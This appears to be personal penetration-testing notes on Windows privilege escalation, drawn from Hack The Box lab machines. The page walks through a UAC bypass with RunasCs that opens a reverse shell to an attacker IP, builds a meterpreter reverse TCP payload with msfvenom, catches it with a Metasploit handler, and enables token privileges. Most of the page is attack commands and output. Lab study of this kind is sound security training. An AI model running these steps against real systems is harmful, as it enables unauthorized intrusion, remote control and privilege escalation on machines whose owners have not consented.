# Services
- [[Weak Permissions#Replacing Service Binary]]
- [[Weak Permissions#Unquoted Service Path]]
- [[Weak Permissions#Permissive Registry ACLs]]
## Check privileges
When you have shell, you may run `whoami /priv` put this shell is in lower intigrety level, So you may have good privileges but you can't see them.

```powershell
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                              State
============================= ======================================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                                Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                          Disabled
```

## UAC bypass

So you need to bypass the UAC to get highter intigrety level shell. You can use  [UACME](https://github.com/hfiref0x/UACME) or `RunasCs.exe`
we have used `-r` for reverse shell, you can make your own reverse shell or execute what ever you want. And `-b` to bypass UAC.

```batch
PS C:\ProgramData> .\RunasCs.exe <username> <password> cmd -r <My-ip>:<PORT> --bypass-uac --logon-type '8'
```

## Enable privileges

After that you need to enable your privileges.
Using powershell directly may make you suffer. So try to use `msfvenom`, `metasploit`


```sh
oxdf@hacky$ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.6 LPORT=9001 -f exe -o rev.exe
oxdf@hacky$ msfconsole
...[snip]...
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST tun0
LHOST => tun0
msf6 exploit(multi/handler) > set LPORT 9001
LPORT => 9001
msf6 exploit(multi/handler) > run
```

At Target:

```powershell
PS 1.st_reverse_shell> .\rev.exe
```

At Metasploit:

```sh
msf6 exploit(multi/handler) >

[*] Started reverse TCP handler on 10.10.14.6:9001
[*] Sending stage (201798 bytes) to 10.10.11.251
[*] Meterpreter session 1 opened (10.10.14.6:9001 -> 10.10.11.251:49690) at 2024-06-03 17:05:50 -0400

meterpreter > getuid
Server username: POV\alaading
```

You may find your self Enabled privileges and if not use `Enable-Privilege.ps1` to enable your priv

```powershell
PS C:\htb> Import-Module .\Enable-Privilege.ps1
PS C:\htb> .\EnableAllTokenPrivs.ps1
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
```
